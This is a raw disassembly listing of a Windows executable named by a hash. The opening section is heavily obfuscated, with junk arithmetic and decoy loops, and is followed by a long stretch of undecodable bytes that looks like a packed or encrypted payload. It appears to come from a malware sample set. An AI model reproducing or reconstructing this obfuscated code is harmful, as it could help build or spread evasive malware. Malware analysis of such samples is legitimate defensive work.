
4a9e7e209193da1dfcbdc04d939f9ac3238e16d92e74e19fbad7d08b8d8f64f1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x12f2c454
  40157e:	inc    edi
  40157f:	sbb    DWORD PTR [ebx+0x7b],edi
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   ecx,ecx
  401595:	mov    cl,BYTE PTR [edx+0x22b38a8b]
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x275c06c4],0x84
  40162d:	clc    
  40162e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40162f:	cld    
  401630:	lahf   
  401631:	retf   0xe393
  401634:	lods   eax,DWORD PTR ds:[esi]
  401635:	dec    esi
  401636:	dec    eax
  401637:	and    al,0x2e
  401639:	test   eax,0x94e8ecc9
  40163e:	mov    ds:0xb4ed22c2,al
  401643:	add    bl,bl
  401645:	dec    ecx
  401646:	pop    ebp
  401647:	je     0x4016a3
  401649:	sbb    bh,BYTE PTR [edi-0x1b]
  40164c:	dec    eax
  40164d:	push   edi
  40164e:	(bad)  
  40164f:	test   al,0x1c
  401651:	test   DWORD PTR [edx-0x49],0x37b7957b
  401658:	lods   al,BYTE PTR ds:[esi]
  401659:	pop    eax
  40165a:	xchg   ecx,eax
  40165b:	(bad)  
  40165d:	loop   0x401604
  40165f:	imul   edi,DWORD PTR [eax-0x7c2222fc],0x3615e7f4
  401669:	push   esi
  40166a:	ret    
  40166b:	in     eax,dx
  40166c:	scas   al,BYTE PTR es:[edi]
  40166d:	leave  
  40166e:	fs lahf 
  401670:	xor    cl,BYTE PTR [edx]
  401672:	mov    dh,0x2f
  401674:	(bad)  
  401675:	imul   DWORD PTR [edx]
  401677:	mov    edx,esi
  401679:	pop    esp
  40167a:	pop    esp
  40167b:	sahf   
  40167c:	sbb    eax,0x83cf0835
  401681:	stos   DWORD PTR es:[edi],eax
  401682:	test   BYTE PTR [ebp+0x53],dh
  401685:	(bad)  
  401686:	loop   0x40167d
  401688:	xor    bl,ah
  40168a:	gs call 0x5a56446e
  401690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401691:	call   0x6de1c417
  401696:	mov    eax,0x1d2bd017
  40169b:	sbb    ecx,DWORD PTR [ebx]
  40169d:	inc    edi
  40169e:	jmp    DWORD PTR [edi]
  4016a0:	xchg   esi,eax
  4016a1:	inc    ecx
  4016a2:	push   edi
  4016a3:	or     eax,0xf6d4dbc8
  4016a8:	mov    bl,0xae
  4016aa:	sbb    BYTE PTR [edx-0xcdb7809],0xa5
  4016b1:	xor    DWORD PTR [esi],eax
  4016b3:	pop    eax
  4016b4:	inc    eax
  4016b5:	mov    dl,0xfb
  4016b7:	lahf   
  4016b8:	dec    ebx
  4016b9:	pop    fs
  4016bb:	jg     0x4016c6
  4016bd:	and    al,BYTE PTR [ecx+edx*8+0x7b6f008c]
  4016c4:	cmp    bh,BYTE PTR [edi-0x76]
  4016c7:	cmp    cl,BYTE PTR [ebx]
  4016c9:	jg     0x40168f
  4016cb:	in     al,0xa
  4016cd:	in     eax,dx
  4016ce:	int    0xa3
  4016d0:	mov    dl,0xcd
  4016d2:	lods   al,BYTE PTR ds:[esi]
  4016d3:	loop   0x40169f
  4016d5:	push   ss
  4016d6:	ja     0x401751
  4016d8:	pop    esp
  4016d9:	or     dl,BYTE PTR [edx+0x63ba5b11]
  4016df:	pop    ss
  4016e0:	cli    
  4016e1:	lock mov al,ds:0x33b77766
  4016e7:	lods   eax,DWORD PTR ds:[esi]
  4016e8:	xor    edi,0xaa6b264e
  4016ee:	push   edx
  4016ef:	jle    0x401763
  4016f1:	mov    ebx,0x10c1c89e
  4016f6:	sbb    dh,BYTE PTR [ebx+0x4cbf75cd]
  4016fc:	popf   
  4016fd:	push   ebx
  4016fe:	mov    ch,0xb3
  401700:	test   eax,0x34f7c059
  401705:	cmp    al,0x9c
  401707:	cmp    esi,ebx
  401709:	push   0x25
  40170b:	dec    edi
  40170c:	adc    ch,BYTE PTR fs:[eax+ebx*4+0x129b096b]
  401714:	int3   
  401715:	out    dx,eax
  401716:	xlat   BYTE PTR ds:[ebx]
  401717:	sbb    dh,BYTE PTR [ebp+eax*2-0x49]
  40171b:	inc    esp
  40171c:	jb     0x4016e0
  40171e:	mov    ebp,0x416e1c3d
  401723:	arpl   WORD PTR [esi+0x61],cx
  401726:	stos   DWORD PTR es:[edi],eax
  401727:	(bad)  
  401729:	out    0x11,al
  40172b:	aaa    
  40172c:	rcl    DWORD PTR [edx],1
  40172e:	aad    0xda
  401730:	and    dl,BYTE PTR [ebp-0x3c]
  401733:	pushf  
  401734:	or     BYTE PTR [edx+ebp*1],al
  401737:	jp     0x4016bc
  401739:	pop    esp
  40173a:	mov    ds:0xefe609a4,al
  40173f:	sub    BYTE PTR [esi+0x4e4fb22],bl
  401745:	mov    WORD PTR [edi-0x2d],fs
  401748:	xchg   esi,eax
  401749:	scas   al,BYTE PTR es:[edi]
  40174a:	and    eax,0x8bbed6d9
  40174f:	fwait
  401750:	into   
  401751:	ins    DWORD PTR es:[edi],dx
  401752:	mov    al,0x8d
  401754:	xchg   edi,eax
  401755:	lock cmp eax,0x148c4dea
  40175b:	or     al,0xbd
  40175d:	sub    DWORD PTR [ebx+0x7ae9a4df],eax
  401763:	pop    edi
  401764:	and    BYTE PTR [edi+0x2fb5456],ch
  40176a:	push   eax
  40176b:	xor    al,0xca
  40176d:	fs (bad) 
  40176f:	in     al,0x5
  401771:	dec    ebx
  401772:	and    BYTE PTR [eax+0x73b58f90],bh
  401778:	pop    esi
  401779:	xchg   ebp,eax
  40177a:	ins    BYTE PTR es:[edi],dx
  40177b:	pop    ebp
  40177c:	jns    0x40171c
  40177e:	nop
  40177f:	inc    eax
  401780:	mov    ds:0x843a0a97,al
  401785:	jns    0x40172e
  401787:	clc    
  401788:	popf   
  401789:	je     0x40175f
  40178b:	push   esi
  40178c:	pop    es
  40178d:	and    DWORD PTR [edx],ecx
  40178f:	inc    ecx
  401790:	lods   al,BYTE PTR ds:[esi]
  401791:	dec    esp
  401792:	sahf   
  401793:	retf   0xa173
  401796:	jmp    0x4017aa
  401798:	mov    eax,ds:0x8fc41029
  40179d:	mov    al,0xcf
  40179f:	jmp    0x4017bc
  4017a1:	ins    BYTE PTR es:[edi],dx
  4017a2:	inc    edi
  4017a3:	pop    ebx
  4017a4:	and    ch,BYTE PTR [ebp+0x46]
  4017a7:	mov    bl,0xb2
  4017a9:	mov    eax,0xda8bb7
  4017ae:	fidivr WORD PTR [eax]
  4017b0:	xchg   edx,eax
  4017b1:	sahf   
  4017b2:	sbb    eax,0xba8711e
  4017b7:	mov    ebx,0x55da35e1
  4017bc:	je     0x4017f5
  4017be:	mov    ah,0x5c
  4017c0:	add    BYTE PTR [edi-0x61],bl
  4017c3:	mov    bl,0x16
  4017c5:	sub    BYTE PTR [edx-0x4c],al
  4017c8:	lea    eax,[edx]
  4017ca:	in     al,dx
  4017cb:	xchg   edi,eax
  4017cc:	call   0x7456263f
  4017d1:	cmp    DWORD PTR [ebx],edi
  4017d3:	jns    0x40176a
  4017d5:	push   ebx
  4017d6:	xchg   DWORD PTR [ebp+0x2d],ebx
  4017d9:	fsubr  QWORD PTR [esi+0x83f71f]
  4017df:	sar    BYTE PTR [edi-0xae2dc3b],0x41
  4017e6:	inc    esi
  4017e7:	ins    DWORD PTR es:[edi],dx
  4017e8:	fidiv  DWORD PTR [edx]
  4017ea:	loop   0x40176d
  4017ec:	jnp    0x401772
  4017ee:	xor    al,0x4f
  4017f0:	rol    bl,cl
  4017f2:	popf   
  4017f3:	iret   
  4017f4:	cmp    ecx,ecx
  4017f6:	(bad)  
  4017f7:	out    dx,al
  4017f8:	(bad)  
  4017f9:	in     eax,0xea
  4017fb:	(bad)  
  4017fc:	mov    ch,0x92
  4017fe:	hlt    
  4017ff:	mov    edx,0x1391ced4
  401804:	xor    DWORD PTR ds:0x4a09b494,ecx
  40180a:	adc    eax,0xa5b4d83a
  40180f:	xor    esp,DWORD PTR ds:0x9c86605e
  401815:	sbb    eax,0xb8ca5f08
  40181a:	imul   edx,DWORD PTR [ecx],0xffffffc0
  40181d:	loope  0x401823
  40181f:	mov    ecx,0xa8747735
  401824:	sahf   
  401825:	int    0xf4
  401827:	in     al,0x23
  401829:	mov    esi,0xebb737f
  40182e:	cli    
  40182f:	pop    ds
  401830:	sub    BYTE PTR [ebx-0x34ee32d8],0x88
  401837:	loopne 0x4017ed
  401839:	adc    DWORD PTR [ebx],edi
  40183b:	mov    edi,ecx
  40183d:	in     eax,dx
  40183e:	or     dh,bh
  401840:	test   edi,ecx
  401842:	pop    ds
  401843:	rol    ah,1
  401845:	dec    eax
  401846:	sbb    BYTE PTR [ecx],0xe4
  401849:	lods   al,BYTE PTR ds:[esi]
  40184a:	jae    0x40185d
  40184c:	(bad)  
  40184d:	jmp    edx
  40184f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401851:	mov    ebx,0xeda7f253
  401856:	loope  0x4017e7
  401858:	outs   dx,BYTE PTR ds:[esi]
  401859:	cmp    eax,0x81aa27a9
  40185e:	xor    dh,bl
  401860:	sbb    bh,dl
  401862:	pop    edi
  401863:	icebp  
  401864:	xchg   BYTE PTR [ecx],bl
  401866:	loop   0x4018bc
  401868:	scas   eax,DWORD PTR es:[edi]
  401869:	jl     0x401892
  40186b:	add    al,0xca
  40186d:	mov    ebp,0x697aa57
  401872:	dec    edx
  401873:	into   
  401874:	test   DWORD PTR [ebx-0x68],0xbc15fee1
  40187b:	or     al,0x3c
  40187d:	icebp  
  40187e:	inc    ebx
  40187f:	sbb    bh,BYTE PTR [ebx+0x4d]
  401882:	pop    ds
  401883:	loop   0x40189b
  401885:	out    dx,eax
  401886:	in     al,0x9b
  401888:	jg     0x40183a
  40188a:	addr16 inc ebp
  40188c:	and    ebx,DWORD PTR [edx]
  40188e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188f:	adc    bl,0xa2
  401892:	aas    
  401893:	sahf   
  401894:	fistp  QWORD PTR [esi]
  401896:	mov    ?,WORD PTR [ebp+0x7ea8599]
  40189c:	push   ebp
  40189d:	push   cs
  40189e:	push   cs
  40189f:	push   ebp
  4018a0:	iret   
  4018a1:	pop    eax
  4018a2:	enter  0x12c4,0x59
  4018a6:	mov    WORD PTR [eax+0x15],fs
  4018a9:	ins    BYTE PTR es:[edi],dx
  4018aa:	adc    DWORD PTR [edx-0x56],edi
  4018ad:	push   cs
  4018ae:	xor    WORD PTR [esi-0x40b4314d],cx
  4018b5:	gs inc edi
  4018b7:	xor    ebp,edi
  4018b9:	cdq    
  4018ba:	and    dl,BYTE PTR [edx-0x5053b22]
  4018c0:	int    0x8c
  4018c2:	jmp    0x7f98:0x9591e688
  4018c9:	fild   DWORD PTR [esi-0x5e78d7cc]
  4018cf:	aam    0xf8
  4018d1:	stos   DWORD PTR es:[edi],eax
  4018d2:	add    dl,BYTE PTR [ecx+0x3a]
  4018d5:	cmp    BYTE PTR [edi],dh
  4018d7:	sub    cl,BYTE PTR [edx]
  4018d9:	adc    eax,0x129de1b4
  4018de:	mov    edx,0x76b747f9
  4018e3:	ds pop es
  4018e5:	in     eax,dx
  4018e6:	jnp    0x40192e
  4018e8:	dec    esi
  4018e9:	mov    cl,0x65
  4018eb:	jl     0x4018cf
  4018ed:	test   DWORD PTR [eax],eax
  4018ef:	leave  
  4018f0:	jl     0x401885
  4018f2:	mov    eax,ds:0xf63b5f3e
  4018f7:	fwait
  4018f8:	icebp  
  4018f9:	cmp    al,0x60
  4018fb:	or     BYTE PTR [edi],cl
  4018fd:	jo     0x4018ff
  4018ff:	sbb    al,0xbd
  401901:	pop    ds
  401902:	out    0x93,al
  401904:	shl    ch,0x91
  401907:	cmp    DWORD PTR [edi],ebp
  401909:	pop    ebx
  40190a:	xor    al,0x84
  40190c:	cmp    DWORD PTR [edi],esi
  40190e:	sub    dh,BYTE PTR [ebx]
  401910:	ret    0x1407
  401913:	sub    bh,BYTE PTR [ecx+0xb]
  401916:	jge    0x4018b5
  401918:	push   0x29
  40191a:	mov    edx,0x13f895b
  40191f:	int3   
  401920:	add    ebp,DWORD PTR [edi]
  401922:	nop
  401923:	mov    al,0xd2
  401925:	mov    eax,ds:0x448b32ed
  40192a:	sub    DWORD PTR [edx+0x41],ebp
  40192d:	sbb    al,0x5
  40192f:	push   ebx
  401930:	jge    0x401955
  401932:	sbb    al,0x8d
  401934:	dec    edx
  401935:	xchg   esp,eax
  401936:	call   0x37ea:0xd07bc99a
  40193d:	sub    ebx,ebp
  40193f:	iret   
  401940:	xchg   ebx,eax
  401941:	and    al,0xb5
  401943:	or     BYTE PTR [edx],dl
  401945:	ret    0xad5b
  401948:	in     eax,0xdb
  40194a:	mov    ecx,0x5bd8157a
  40194f:	in     eax,dx
  401950:	aad    0x42
  401952:	mov    esi,0xaec12b12
  401957:	mov    WORD PTR [ecx],?
  401959:	(bad)  
  40195a:	xchg   ebx,eax
  40195b:	pop    ds
  40195c:	mov    cl,0x93
  40195e:	adc    DWORD PTR [edi+0x2b],eax
  401961:	and    al,0xf8
  401963:	jmp    0x401989
  401965:	popa   
  401966:	lods   eax,DWORD PTR ds:[esi]
  401967:	mov    ds:0x625b1de2,eax
  40196c:	addr16 cs out dx,al
  40196f:	gs sar edx,1
  401972:	sbb    DWORD PTR [esi-0x6c98b2bd],esp
  401978:	cli    
  401979:	mov    esi,0x23c41bba
  40197e:	jg     0x40195b
  401980:	pushf  
  401981:	test   BYTE PTR [ebx+0x20],cl
  401984:	jb     0x401969
  401986:	mov    bh,0xed
  401988:	inc    edi
  401989:	cmp    eax,0x7d7d0d73
  40198e:	loopne 0x4019f8
  401990:	dec    esi
  401991:	repnz cmp DWORD PTR ds:0x50fe3a07,esp
  401998:	sbb    dl,BYTE PTR [eax]
  40199a:	pop    ds
  40199b:	push   ecx
  40199c:	jb     0x401953
  40199e:	sub    eax,0xab4d5a48
  4019a3:	jbe    0x401a0b
  4019a5:	out    0xd,al
  4019a7:	jge    0x4019b5
  4019a9:	sub    ebx,DWORD PTR [edx+eax*1+0x59de0333]
  4019b0:	sbb    ebp,ebp
  4019b2:	fadd   DWORD PTR [ebp-0x5b]
  4019b5:	pushf  
  4019b6:	xor    ebx,DWORD PTR [eax]
  4019b8:	nop
  4019b9:	inc    edx
  4019ba:	out    dx,al
  4019bb:	fpatan 
  4019bd:	(bad)  
  4019be:	fld    TBYTE PTR [eax+0x21]
  4019c1:	jno    0x4019f6
  4019c3:	dec    edx
  4019c4:	lods   al,BYTE PTR ds:[esi]
  4019c5:	add    esp,DWORD PTR [ecx]
  4019c7:	mov    BYTE PTR [eax],dh
  4019c9:	xchg   ecx,eax
  4019ca:	pop    es
